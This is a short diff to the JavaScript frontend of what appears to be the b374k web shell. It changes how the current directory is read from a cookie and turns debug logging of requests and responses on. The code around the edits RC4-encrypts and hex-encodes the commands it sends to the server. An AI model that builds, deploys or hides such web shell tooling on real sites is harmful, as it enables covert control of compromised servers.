@@ -241,7 +241,11 @@ function start_scroll(str){
 }
 
 function get_cwd(){
-	return hex2bin(decodeURIComponent(get_cookie('cwd')));
+	return hex2bin(get_cookie('cwd'));
+    /*try {
+        cwd = decodeURIComponent(escape(cwd));
+    } catch(e) {}
+    return cwd;*/
 }
 
 function fix_tabchar(el, e){
@@ -288,7 +292,7 @@ function send_post(data, callback, loading){
 	if(typeof data == "object") {
 		enc = $.param(data);
 	}
-    // console.log("b374k> data : " + enc);
+	output("data : " + enc);
 	data = {
 		args: bin2hex(rc4(window['cipher_key'], enc))
 	};
@@ -301,7 +305,7 @@ function send_post(data, callback, loading){
             try {
                 res = decodeURIComponent(escape(res));
             } catch(e) {}
-            // console.log("b374k> callback : " + res);
+            output("callback : " + res);
 			callback(res);
 			if(loading==null) loading_stop();
 		},
